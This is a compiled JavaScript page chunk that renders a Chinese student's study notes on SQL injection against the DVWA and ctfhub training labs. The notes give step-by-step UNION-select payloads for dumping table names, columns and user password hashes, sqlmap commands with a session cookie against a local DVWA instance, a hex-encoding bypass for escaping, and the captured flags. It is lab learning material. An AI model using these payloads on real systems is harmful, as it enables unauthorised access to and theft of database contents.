(window.webpackJsonp=window.webpackJsonp||[]).push([[4],{2288:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"张心玥学习报告02-2"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#张心玥学习报告02-2"}},[t._v("#")]),t._v(" 张心玥学习报告02-2")]),t._v(" "),n("h1",{attrs:{id:"学习笔记"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#学习笔记"}},[t._v("#")]),t._v(" 学习笔记")]),t._v(" "),n("h2",{attrs:{id:"dvwa靶场sql注入"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#dvwa靶场sql注入"}},[t._v("#")]),t._v(" DVWA靶场SQL注入")]),t._v(" "),n("h3",{attrs:{id:"手工注入low"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#手工注入low"}},[t._v("#")]),t._v(" 手工注入LOW")]),t._v(" "),n("p",[t._v("已知数据库为dvwa")]),t._v(" "),n("ol",[n("li",[n("p",[t._v("继续查询数据库中的表\n输入：1' union select 1,table_name COLLATE utf8_general_ci from information_schema.tables where table_schema='dvwa\n得到\n"),n("img",{attrs:{src:a(894),alt:""}})])]),t._v(" "),n("li",[n("p",[t._v("查询表中的字段\n输入：1' union select 1,group_concat(column_name) COLLATE utf8_general_ci from information_schema.columns where table_name='users\n得到\n"),n("img",{attrs:{src:a(895),alt:""}})])]),t._v(" "),n("li",[n("p",[t._v("查询表中的内容\n输入：1' union select group_concat(user_id,first_name,last_name),group_concat(user,password) COLLATE utf8_general_ci from users#\n得到\n"),n("img",{attrs:{src:a(896),alt:""}})])])]),t._v(" "),n("p",[t._v("得到的密文为MD5加密，解密即可得到密码")]),t._v(" "),n("p",[t._v("注：手工注入的时候遇到Illegal mix of collations for operation 'UNION'是因为字符编码问题，在sql语句from前添加 COLLATE utf8_general_ci 就可")]),t._v(" "),n("h3",{attrs:{id:"sqlmap-low"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap-low"}},[t._v("#")]),t._v(" SQLmap LOW")]),t._v(" "),n("p",[t._v("运行sqlmap")]),t._v(" "),n("ol",[n("li",[n("p",[t._v('检测网站的漏洞\n输入：python sqlmap.py -u"http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=jvkp3tq5cugu8emi4liqljfhrf"\n得到\n'),n("img",{attrs:{src:a(897),alt:""}}),t._v("\n注：-u:url")])]),t._v(" "),n("li",[n("p",[t._v('获取数据库名\n输入：python sqlmap.py -u"http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=jvkp3tq5cugu8emi4liqljfhrf" --dbs\n得到\n'),n("img",{attrs:{src:a(898),alt:""}}),t._v("\n注：dbs：database sever（获取所有数据库名）")])]),t._v(" "),n("li",[n("p",[t._v('获取指定数据库内容\n输入：python sqlmap.py -u"http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=jvkp3tq5cugu8emi4liqljfhrf" -D dvwa --tables\n得到\n'),n("img",{attrs:{src:a(899),alt:""}}),t._v("\n注：-D：database 指定想要获取数据库的名\n--tables 列出数据库表")])]),t._v(" "),n("li",[n("p",[t._v('获取指定数据库列/表项\n输入：python sqlmap.py -u"http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=jvkp3tq5cugu8emi4liqljfhrf" -D dvwa -T users --columns\n得到\n'),n("img",{attrs:{src:a(900),alt:""}}),t._v("\n注：-T table 指定想要获取的表名\n--columns 列出表项/列")])]),t._v(" "),n("li",[n("p",[t._v('获取数据\n输入：python sqlmap.py -u"http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=jvkp3tq5cugu8emi4liqljfhrf" -D dvwa -T users --dump\n得到\n'),n("img",{attrs:{src:a(901),alt:""}}),t._v("\n注：--dump 读取数据")])])]),t._v(" "),n("p",[t._v("得到的密文为MD5加密，解密即可得到密码")]),t._v(" "),n("h3",{attrs:{id:"sql注入防御"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#sql注入防御"}},[t._v("#")]),t._v(" SQL注入防御")]),t._v(" "),n("p",[t._v("过滤用户输入内容，不让输入sql语句，将特殊符号替换成空，或者判断用户输入sql语句就终止执行。")]),t._v(" "),n("h3",{attrs:{id:"sql注入medium"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#sql注入medium"}},[t._v("#")]),t._v(" SQL注入Medium")]),t._v(" "),n("p",[t._v("medium转义了特殊字符，如\n原本sql语句：\n1' union select 1,table_name COLLATE utf8_general_ci from information_schema.tables where table_schema='dvwa\n转义为：\n1' union select 1,table_name COLLATE utf8_general_ci from information_schema.tables where table_schema='dvwa\n所以sql语句错误，无法正常执行\n解决办法：\n输入内容中避免特殊字符存在，进行等价替换，如：\n将 'dvwa' 替换成 database()\n或\n将 'dvwa' 替换成 0x64767761\n注：0x64767761 为 dvwa 的十六进制格式")]),t._v(" "),n("h3",{attrs:{id:"ctfhub-sql注入"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#ctfhub-sql注入"}},[t._v("#")]),t._v(" ctfhub SQL注入")]),t._v(" "),n("h4",{attrs:{id:"整数型注入"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#整数型注入"}},[t._v("#")]),t._v(" 整数型注入")]),t._v(" "),n("p",[t._v("输入1原始页面\n"),n("img",{attrs:{src:a(902),alt:""}})]),t._v(" "),n("ol",[n("li",[n("p",[t._v("判断是否存在注入")]),t._v(" "),n("ol",[n("li",[t._v("加单引号\n得到"),n("img",{attrs:{src:a(903),alt:""}}),t._v("\nsql语句出错，程序无法正常从数据库中查询出数据，存在异常。")]),t._v(" "),n("li",[t._v("加 and 1=1\n得到"),n("img",{attrs:{src:a(904),alt:""}}),t._v("\n语句执行正常。")]),t._v(" "),n("li",[t._v("加 and 1=2\n得到"),n("img",{attrs:{src:a(905),alt:""}}),t._v("\n语句可以正常执行，但是无法查询出结果，存在异常。\n满足以上三点，判断有整数型注入。")])])]),t._v(" "),n("li",[n("p",[t._v("查询字段数量")]),t._v(" "),n("ol",[n("li",[t._v("输入 1 order by 1\n得到"),n("img",{attrs:{src:a(906),alt:""}})]),t._v(" "),n("li",[t._v("输入 1 order by 2\n得到"),n("img",{attrs:{src:a(907),alt:""}})]),t._v(" "),n("li",[t._v("输入 1 order by 3\n得到"),n("img",{attrs:{src:a(908),alt:""}}),t._v("\n所以判断字段数为2")])])]),t._v(" "),n("li",[n("p",[t._v("查询SQL语句插入\n注：此时要先保证之前的数据查不出来，之后再union。因为id=-1数据不存在数据库中。所以继续查询。\n输入 -1 union select 1,2\n得到"),n("img",{attrs:{src:a(909),alt:""}}),t._v("\n所以判断2处可以插入sql语句")])]),t._v(" "),n("li",[n("p",[t._v("获取数据库名")]),t._v(" "),n("ol",[n("li",[n("p",[t._v("获取当前数据名\n输入 -1 union select 1,database()\n得到"),n("img",{attrs:{src:a(910),alt:""}}),t._v("\n所以当前数据库名称为sqli")])]),t._v(" "),n("li",[n("p",[t._v("获取所有数据库名\n输入 -1 union select 1,group_concat(schema_name)from information_schema.schemata\n得到"),n("img",{attrs:{src:a(911),alt:""}})])])])]),t._v(" "),n("li",[n("p",[t._v("获取数据库表名")]),t._v(" "),n("ol",[n("li",[n("p",[t._v("获取当前数据库所有表名\n输入 -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'\n得到"),n("img",{attrs:{src:a(912),alt:""}})])]),t._v(" "),n("li",[n("p",[t._v("逐个获取表名\n输入 -1 union select 1,(select table_name from information_schema.tables where table_schema='sqli' limit 0,1)\n得到"),n("img",{attrs:{src:a(913),alt:""}}),t._v("\n输入 -1 union select 1,(select table_name from information_schema.tables where table_schema='sqli' limit 1,1)\n得到"),n("img",{attrs:{src:a(914),alt:""}})])])])]),t._v(" "),n("li",[n("p",[t._v("获取字段名\n输入 -1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'\n得到"),n("img",{attrs:{src:a(915),alt:""}})])]),t._v(" "),n("li",[n("p",[t._v("获取数据\n输入 -1 union select 1,group_concat(flag) from sqli.flag\n得到"),n("img",{attrs:{src:a(916),alt:""}})])])]),t._v(" "),n("p",[t._v("至此得到flag：\nctfhub{5f3c2363dc7cb398a7e24388}")]),t._v(" "),n("h4",{attrs:{id:"字符型注入"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#字符型注入"}},[t._v("#")]),t._v(" 字符型注入")]),t._v(" "),n("p",[t._v("输入1原始界面\n"),n("img",{attrs:{src:a(917),alt:""}}),t._v("\n所以需要规避掉单引号再插入查询语句")]),t._v(" "),n("ol",[n("li",[n("p",[t._v("输入 1’\n得到"),n("img",{attrs:{src:a(918),alt:""}}),t._v("\n所以确定闭合方式：1’")])]),t._v(" "),n("li",[n("p",[t._v("查询数据库名\n输入 -1' union select 1,database()#\n得到"),n("img",{attrs:{src:a(919),alt:""}}),t._v("\n数据库名为sqli")])]),t._v(" "),n("li",[n("p",[t._v("获取数据库表名\n输入 -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#\n得到"),n("img",{attrs:{src:a(920),alt:""}})])]),t._v(" "),n("li",[n("p",[t._v("获取数据库中字段\n输入 -1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'#\n得到"),n("img",{attrs:{src:a(921),alt:""}})])]),t._v(" "),n("li",[n("p",[t._v("获取数据\n输入 -1' union select flag,1 from flag#\n得到"),n("img",{attrs:{src:a(922),alt:""}}),t._v("\n至此得到flag：\nctfhub{0a0a5e27bc8a21d19fe224c1}")])])])])}),[],!1,null,null,null);s.default=e.exports},894:function(t,s,a){t.exports=a.p+"assets/img/2022-03-26-14-57-03.d287f93d.png"},895:function(t,s,a){t.exports=a.p+"assets/img/2022-03-26-14-57-42.cfea595c.png"},896:function(t,s,a){t.exports=a.p+"assets/img/2022-03-26-14-57-58.c471d264.png"},897:function(t,s,a){t.exports=a.p+"assets/img/2022-03-26-15-11-16.2b9c0286.png"},898:function(t,s,a){t.exports=a.p+"assets/img/2022-03-26-15-14-07.a1dfb757.png"},899:function(t,s,a){t.exports=a.p+"assets/img/2022-03-26-15-16-39.e02f19cf.png"},900:function(t,s,a){t.exports=a.p+"assets/img/2022-03-26-15-21-43.faedd249.png"},901:function(t,s,a){t.exports=a.p+"assets/img/2022-03-26-15-26-03.53fbe084.png"},902:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-14-54-07.04ea994e.png"},903:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-14-55-02.65cadd1b.png"},904:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-14-55-57.817aa4cb.png"},905:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-14-57-04.63c7fc68.png"},906:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-02-28.038488c5.png"},907:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-02-50.ca952133.png"},908:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-03-15.f18a8371.png"},909:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-05-13.456bbfd0.png"},910:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-09-43.38dd6c1d.png"},911:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-23-28.7190b8cd.png"},912:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-27-23.d151b09b.png"},913:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-30-02.67e6feb1.png"},914:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-30-54.f05c98f9.png"},915:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-33-02.7c076396.png"},916:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-34-31.65916a78.png"},917:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-49-22.43b289a7.png"},918:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-52-42.0a692006.png"},919:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-15-58-27.2e85de8c.png"},920:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-16-04-20.da9d98d2.png"},921:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-16-07-56.44d0c6a4.png"},922:function(t,s,a){t.exports=a.p+"assets/img/2022-03-27-16-09-14.26cb6e34.png"}}]);